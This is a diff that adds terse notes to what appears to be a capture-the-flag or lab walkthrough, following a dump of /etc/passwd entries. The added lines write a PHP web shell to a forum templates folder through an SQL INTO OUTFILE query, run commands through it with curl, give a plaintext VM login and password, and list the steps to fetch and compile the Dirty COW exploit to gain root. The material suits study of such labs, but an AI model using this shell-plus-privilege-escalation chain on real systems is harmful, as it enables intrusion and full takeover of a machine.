@@ -50,3 +50,23 @@ dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
 postfix:x:110:118::/var/spool/postfix:/bin/false
 "}]
 ```
+
+select "<?=`{$_REQUEST['_']}`?>" INTO OUTFILE  "/var/www/forum/templates_c/cmd3.php"
+
+curl --insecure  -X POST https://localhost:8443/forum/templates_c/cmd3.php -d "_=ls" 
+
+
+vm login: lmezard
+pass: G!@M6f4Eatau{sF"
+
+
+method 1:
+dirty cow
+
+wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+
+change the firefart string to the name of the new root user
+
+gcc -pthread dirty.c -o dirty -lcrypt
+
+you are now root
